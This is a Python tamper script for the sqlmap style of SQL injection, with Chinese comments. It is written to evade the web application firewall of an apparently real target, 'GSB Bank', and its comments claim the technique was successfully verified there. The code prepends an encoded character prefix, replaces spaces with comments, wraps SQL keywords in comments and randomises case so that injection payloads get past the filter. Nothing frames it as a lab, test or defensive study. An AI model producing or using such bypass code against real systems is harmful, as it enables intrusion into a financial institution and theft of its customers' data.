#!/usr/bin/env python
"""
GSB Bank WAF Bypass Tamper Script
基于成功验证的绕过技术
"""

import random
import string

def tamper(payload, **kwargs):
    """
    GSB银行专用WAF绕过脚本
    基于成功验证的1461%21%40%23%24%25%5E%26%2A%28%29技术
    """
    if payload:
        # 添加特殊字符前缀 (成功验证的技术)
        prefix = '%21%40%23%24%25%5E%26%2A%28%29'  # !@#$%^&*()
        payload = prefix + payload

        # 替换空格为注释 (space2comment)
        payload = payload.replace(' ', '/**/')

        # SQL关键字注释绕过
        payload = payload.replace('SELECT', '/**/SELECT/**/')
        payload = payload.replace('UNION', '/**/UNION/**/')
        payload = payload.replace('FROM', '/**/FROM/**/')
        payload = payload.replace('WHERE', '/**/WHERE/**/')
        payload = payload.replace('AND', '/**/AND/**/')
        payload = payload.replace('OR', '/**/OR/**/')

        # 随机大小写 (randomcase)
        payload = ''.join(random.choice([c.upper(), c.lower()]) if c.isalpha() else c for c in payload)

    return payload